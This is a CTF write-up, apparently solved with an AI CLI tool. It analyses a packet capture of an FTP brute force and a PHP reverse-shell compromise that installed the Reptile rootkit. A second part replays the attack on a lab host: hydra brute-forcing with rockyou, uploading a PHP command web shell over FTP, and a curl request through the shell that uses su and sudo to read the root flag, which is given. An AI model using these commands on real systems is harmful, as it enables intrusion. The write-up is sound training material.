# CTF Analysis - Capture_1612220005488.pcapng
**(*solved by gemini-cli 🤖🤖🤖*)**

This document outlines the commands used to solve the questions based on the provided network capture.

### 1. Service Identification
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -c 100
```
**Reasoning:** The initial packets show a large number of SYN requests from `192.168.0.147` to `192.168.0.115` on port 21 (FTP).

### 2. Brute Force Tool
**Reasoning:** Van Hauser (Marc Heuse) is the creator of **Hydra**, a very popular parallelized login cracker.

### 3. Target Username
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "ftp.request.command == \"USER\"" -T fields -e ftp.request.arg | sort -u
```
**Reasoning:** The capture shows repeated `USER jenny` commands, indicating a brute-force attack against that account.

### 4. User Password
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "ftp.response.code == 230" -T fields -e frame.number
tshark -r Capture_1612220005488.pcapng -Y "tcp.stream == 7" -T fields -e ftp.request.command -e ftp.request.arg -e ftp.response.code
```
**Reasoning:** Found the successful login (code 230) in packet 305. Looking back in the same TCP stream (index 7), the preceding `PASS` command was `password123`.

### 5. FTP Working Directory
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "ftp.request.command == \"PWD\"" -T fields -e ftp.response.arg
```
**Reasoning:** After login, the attacker issued a `PWD` command, and the server responded with `"/var/www/html"`.

### 6. Backdoor Filename
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "ftp.request.command == \"STOR\""
```
**Reasoning:** The attacker uploaded a file using the `STOR shell.php` command.

### 7. Backdoor Source URL
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "tcp.stream == 18" -T fields -e tcp.payload | xxd -r -p
```
**Reasoning:** Stream 18 contained the data transfer for `shell.php`. Inspecting the file content revealed the URL: `http://pentestmonkey.net/tools/php-reverse-shell`.

### 8. Manual Command After Reverse Shell
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "tcp.stream == 20" -T fields -e tcp.payload | xxd -r -p
```
**Reasoning:** Stream 20 contains the reverse shell session. The first manual command typed by the attacker after the automated `uname -a; w; id; /bin/sh -i` sequence was `whoami`.

### 9. Hostname
**Reasoning:** Observed from the shell prompt in stream 20: `jenny@wir3:/$`. The hostname is `wir3`.

### 10. TTY Spawn Command
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "tcp.stream == 20" -T fields -e tcp.payload | xxd -r -p | grep python
```
**Reasoning:** In the reverse shell session, the attacker ran: `python3 -c 'import pty; pty.spawn("/bin/bash")' `.

### 11. Command to Gain Root
**Command:**
```bash
tshark -r Capture_1612220005488.pcapng -Y "tcp.stream == 20" -T fields -e tcp.payload | xxd -r -p
```
**Reasoning:** After switching to user `jenny`, the attacker executed `sudo su` to become root.

### 12. GitHub Project
**Command:**
```bash
strings Capture_1612220005488.pcapng | grep github
```
**Reasoning:** The attacker cloned the repository: `https://github.com/f0rb1dd3n/Reptile.git`. The project name is `Reptile`.

### 13. Backdoor Type
**Reasoning:** **Reptile** is a well-known Linux LKM (Linux Kernel Module) **rootkit**.

---

# HackBack

In the second part of the challenge, the target was moved to a live IP (`10.48.149.99`), and the user password was changed. The objective was to replicate the attacker's path to read the flag at `/root/Reptile/flag.txt`.

### 1. Reconnaissance
**Command:**
```bash
nmap -sV -p- 10.48.149.99
```
**Reasoning:** Verified that ports 21 (FTP), 22 (SSH), and 80 (HTTP) were open, mirroring the environment in the PCAP.

### 2. Password Discovery (Brute Force)
**Command:**
```bash
hydra -l jenny -P /home/kali/rockyou.txt ftp://10.48.149.99 -t 64
```
**Reasoning:** Since the challenge stated the password was changed, I used `hydra` with the `rockyou.txt` wordlist. The new password was found to be **`987654321`**.

### 3. Gaining Access (Web Shell)
**Command:**
```bash
echo -e "user jenny 987654321\nput cmd.php\nsite chmod 777 cmd.php\nquit" | ftp -n 10.48.149.99
```
**Reasoning:** Used the discovered credentials to upload a simple command-execution web shell (`<?php system($_GET['c']); ?>`) to the `/var/www/html` directory via FTP.

### 4. Privilege Escalation & Flag Retrieval
**Command:**
```bash
curl "http://10.48.149.99/cmd.php?c=echo%20987654321%20|%20su%20-c%20'echo%20987654321%20|%20sudo%20-S%20cat%20/root/Reptile/flag.txt'%20jenny"
```
**Reasoning:** 
- The web shell runs as `www-data`.
- I used `su jenny` to switch to the user account using the new password.
- Since `jenny` had full `sudo` privileges in the PCAP, I used `sudo` to escalate to root.
- The `flag.txt` was then read from the `/root/Reptile` directory.

**Final Flag:** `ebcefd66ca4b559d17b440b6e67fd0fd`